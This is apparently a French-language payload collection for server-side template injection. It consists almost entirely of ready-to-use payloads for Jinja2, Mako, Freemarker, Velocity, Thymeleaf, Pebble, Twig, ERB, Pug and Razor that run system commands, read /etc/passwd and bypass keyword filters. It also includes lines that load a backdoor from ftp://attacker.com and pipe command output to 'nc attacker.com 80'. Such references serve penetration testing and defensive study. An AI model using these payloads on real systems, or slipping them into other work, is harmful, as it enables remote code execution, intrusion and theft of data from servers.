# 🔥 Collection de charges utiles SSTI

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](SSTI.tr.md) • [🇬🇷 Ελληνικά](SSTI.el.md)

```
  ███████╗███████╗████████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔════╝╚══██╔══╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗███████╗   ██║   ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║╚════██║   ██║   ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║███████║   ██║   ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚══════╝   ╚═╝   ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
                     Server-Side Template Injection
```

> **Précisions de lecture :** Les versions, classes accessibles et règles de bac à sable changent selon le moteur. Certains indices de classes, attributs et exemples anciens ne sont pas universels. Un résultat arithmétique peut être un indice à confirmer, pas une preuve suffisante de RCE. Les payloads et leurs valeurs restent ceux de la source.

---

## 🔍 Charges utiles de détection

### Détection générale
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
{{7*'7'}}
```

> La valeur `49` dans la réponse peut indiquer une évaluation de modèle ; elle ne suffit pas à elle seule à démontrer une vulnérabilité SSTI.

### Identifier le moteur de modèles
```
{{7*'7'}}         → Jinja2/Twig returns 7777777
${7*7}            → Freemarker/Velocity
<%= 7*7 %>        → ERB (Ruby)
#{7*7}            → Pebble
*{7*7}            → Thymeleaf
```

---

## 🐍 Python (Jinja2)

### Détection
```python
{{7*7}}
{{config}}
{{config.items()}}
{{self}}
{{request}}
```

### Charges utiles d’exécution de code à distance
```python
# Méthode 1 — config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Méthode 2 — cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Méthode 3 — MRO (méthode courante)
{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}

# Méthode 4 — lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# Méthode 5 — Request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Lire des fichiers
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}
```

### Contournement des filtres
```python
# Avec le filtre attr
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Avec le filtre join
{%set x=''|join('')|attr('__class__')%}

# Encodage hexadécimal
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

## 🌿 Python (Mako)

```python
<%import os%>${os.popen("id").read()}
${self.module.cache.util.os.system("id")}
${self.template.module.cache.util.os.popen("id").read()}
```

---

## ☕ Java (Freemarker)

### Détection
```java
${7*7}
${object.class}
<#assign s="freemarker.template.utility.Execute"?new()>${s("id")}
```

### Charges utiles d’exécution de code à distance
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## 🍃 Java (Velocity)

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Exemple simple
```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

---

## 🌱 Java (Thymeleaf)

### Détection
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

### Charges utiles d’exécution de code à distance
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

---

## 🌸 Java (Pebble)

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}
```

---

## 🐦 PHP (Twig)

### Détection
```php
{{7*7}}
{{7*'7'}}  → 7777777 (string multiplication)
{{dump(app)}}
{{_self}}
```

### Charges utiles d’exécution de code à distance
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}

{{['id']|map('system')|join}}

{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}
```

### Lire des fichiers
```php
{{'/etc/passwd'|file_excerpt(1,-1)}}
```

---

## 💎 Ruby (ERB)

### Détection
```ruby
<%= 7*7 %>
<%= self %>
```

### Charges utiles d’exécution de code à distance
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id') %>
```

---

## 🟢 Node.js (Jade/Pug)

### Détection
```javascript
#{7*7}
-var x = 1; p= x
```

### Charges utiles d’exécution de code à distance
```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

-var x = root.process.mainModule.require
-x('child_process').exec('id | nc attacker.com 80')
```

---

## 🔷 .NET (Razor)

```csharp
@(7*7)
@{
    var p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c id";
    p.Start();
}
```

---

## 📊 Référence rapide

|Moteur de modèles|Détection|RCE|
|-----------------|-----------|-----|
|Jinja2|`{{7*7}}`|`{{config.__class__...}}`|
|Twig|`{{7*'7'}}`|`{{_self.env...}}`|
|Freemarker|`${7*7}`|`<#assign ex=...>`|
|Velocity|`$class.class`|`#set($rt=...)`|
|ERB|`<%= 7*7 %>`|`<%= system('id') %>`|
|Pug|`#{7*7}`|`#{global.process...}`|

---

## 🛡️ Techniques de contournement

### Mots-clés bloqués
```python
# Utiliser les arguments de la requête
{{request.args.cmd}}?cmd=__class__

# Concaténation de chaînes
{{''['__cla'+'ss__']}}

# Encodage hexadécimal
{{''['\x5f\x5fclass\x5f\x5f']}}
```

### Crochets bloqués
```python
{%print(7*7)%}
```

---

## 📚 Ressources

- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

<p align="center">
  <b>🔥 Collection de charges utiles SSTI</b><br>
  <i>À des fins pédagogiques uniquement !</i>
</p>
